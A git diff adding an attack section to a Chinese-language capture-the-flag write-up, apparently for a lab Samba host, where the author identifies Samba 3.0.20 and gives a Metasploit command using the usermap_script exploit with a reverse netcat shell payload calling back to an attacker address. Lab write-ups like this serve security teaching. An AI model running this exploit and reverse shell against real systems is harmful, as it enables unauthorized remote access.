@@ -57,7 +57,30 @@ ans:No
 知道版本號，就可以從GOOGLE查該版本的CVE漏洞使用
 
   ![image](https://github.com/user-attachments/assets/308c8dfc-1b0c-44b8-8485-245a85b0fbab)
-  
+
+
+5.攻擊流程
+Submit the flag located in the makis user's home directory.
+
+![image](https://github.com/user-attachments/assets/690b98e0-ea7a-44a4-8add-b4c0feb760cb)
+
+執行畫面 
+
+![image](https://github.com/user-attachments/assets/b3bd4273-1e2d-4008-9f14-ab16520f7b11)
+
+無法確認版本，改用smbclient
+
+![image](https://github.com/user-attachments/assets/66a0b06c-2804-481f-9d28-77817fd3229a)
+
+找出版本為3.0.20
+
+![image](https://github.com/user-attachments/assets/e62836e2-ec70-40af-8ddc-c6cfed281760)
+
+![image](https://github.com/user-attachments/assets/3abc2f22-f81f-4749-bc2c-1e97e0a56036)
+
+
+<pre> ```bash msfconsole use exploit/multi/samba/usermap_script set RHOSTS 10.10.10.3 set PAYLOAD cmd/unix/reverse_netcat set LHOST 10.10.14.71 run ``` </pre>
+
 
 
   
